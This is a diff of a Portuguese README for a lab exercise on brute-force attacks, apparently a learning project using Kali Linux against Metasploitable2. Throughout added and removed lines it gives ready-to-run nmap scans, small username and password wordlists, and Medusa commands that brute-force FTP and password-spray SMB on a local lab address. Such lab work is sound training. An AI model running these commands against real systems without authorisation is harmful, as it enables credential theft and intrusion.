@@ -1,7 +1,7 @@
 # Projeto Medusa Kali Linux — Laboratório de Ataques de Força Bruta
 
 
-## ❗❗ Aviso Legal ❗❗️
+## ❗ Aviso Legal ❗
 
 Todos os testes descritos neste projeto foram realizados **somente em ambiente controlado** (Kali Linux + Metasploitable2/DVWA). Não tente executar esses comandos em sistemas sem autorização.
 
@@ -39,17 +39,26 @@ Para verificar a conectividade entre as duas máquinas virtuais, utilize o coman
 
 Exemplo:
 
-``ping -c 3 192.168.56.101``
+``` bash
+ping -c 3 192.168.56.101
+```
+
 
 <img width="1056" height="633" alt="pingdamaquina" src="https://github.com/user-attachments/assets/9652c021-ca3f-4428-897c-6864dc6386e2" />
 
 
 ---
 
+
 ## 📡 Reconhecimento das portas com Nmap
 O primeiro passo no processo de varredura é executar o ``nmap``, que nos permitirá identificar serviços ativos e portas abertas. nmap [endereço_ip_do_metasploitable2]
 
-``nmap 192.168.56.101``
+
+``` bash
+nmap 192.168.56.101
+```
+
+
 
 🔽 Saída esperada:
 
@@ -59,64 +68,88 @@ O primeiro passo no processo de varredura é executar o ``nmap``, que nos permit
 
 Vamos focar nas portas 21, 22, 80, 445 e 139 com o comando:
 
-``nmap -sV -p 21,22,80,445,139 192.168.56.101``
+
+``` bash
+nmap -sV -p 21,22,80,445,139 192.168.56.101
+```
+
 
 
 <img width="901" height="594" alt="nmapsaida" src="https://github.com/user-attachments/assets/c6fc742d-7330-4f58-b422-8c7ffbd7a67e" />
 
+
+
 ---
 
+
+
+
 ## Ataque de força bruta no serviço FTP
+
+
 Durante a análise, observamos que a porta 21/TCP está ativa, indicando a presença de um serviço FTP (File Transfer Protocol).
 Esse protocolo é utilizado para movimentação de arquivos entre sistemas e pode ser alvo de ataques de força bruta, caso não esteja devidamente protegido.
 
+
+
 A identificação da porta foi feita por meio do Nmap:
+
+
+
+<img width="901" height="345" alt="verificandonmap" src="https://github.com/user-attachments/assets/eba9677b-70e4-446a-8820-a826d52a6632" />
 
 
 
 
 ## Wordlists
 
-* `wordlists/users.txt` — exemplo: admin, user, test, ftp, guest
-* `wordlists/passwords.txt` — exemplo: 123456, password, admin, toor, welcome
 
----
 
-## 1) Enumeração (Nmap)
+Nesta fase, foram elaboradas duas wordlists: uma contendo nomes de usuários e outra com senhas prováveis.
+Os comandos utilizados foram:
 
-```bash
-sudo nmap -sS -sV -p 21,22,23,80,139,445,8080 -T4 -oN reports/nmap_quick_192.168.56.101.txt 192.168.56.101
-sudo nmap -sS -sV -p- -T4 -oN reports/nmap_full_192.168.56.101.txt 192.168.56.101
+
+
+Lista de usuários:
+
+``` bash
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt`
 ```
 
-**Observação:** identifica serviços ativos e portas abertas.
+Lista de senhas:
+
+
+``` bash
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+```
+
+
 
 ---
+
+
 
 ## 2) Ataque FTP (Medusa)
 
-```bash
-medusa -M ftp -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -t 6 -f -O reports/medusa_ftp_192.168.56.101.txt
+
+Nesta fase do teste, utilizaremos o Medusa, uma ferramenta de brute force, para tentar descobrir credenciais válidas do serviço FTP. Para isso, usaremos as listas de usuários e senhas que criamos anteriormente.
+
+``` bash
+medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
 ```
+Exemplo: 
 
-* `-f` interrompe ao encontrar credencial válida.
-* Salvar evidências: `reports/medusa_ftp_192.168.56.101.txt`
-* Screenshot: `images/02_medusa_ftp_found.png`
+<img width="733" height="821" alt="medusacod" src="https://github.com/user-attachments/assets/5af1314b-db4c-452b-a913-75f4fbd72e80" />
 
----
 
-## 3) Password Spraying SMB (Medusa)
 
-```bash
-# Usuário único
-medusa -M smbnt -h 192.168.56.101 -u administrator -P wordlists/passwords.txt -t 8 -O reports/medusa_smb_admin_192.168.56.101.txt
+## Acessando o serviço FTP com as credenciais encontradas
 
-# Vários usuários
-medusa -M smbnt -h 192.168.56.101 -U wordlists/users.txt -P wordlists/passwords.txt -t 8 -O reports/medusa_smb_users_192.168.56.101.txt
-```
 
-* Evidência: arquivos em `reports/`
-* Screenshot: `images/03_medusa_smb_result.png`
+<img width="1117" height="765" alt="acessoamaquina" src="https://github.com/user-attachments/assets/4b076eeb-7fcd-49fe-9301-057f830bdf98" />
+
+
+
 
 ---
 
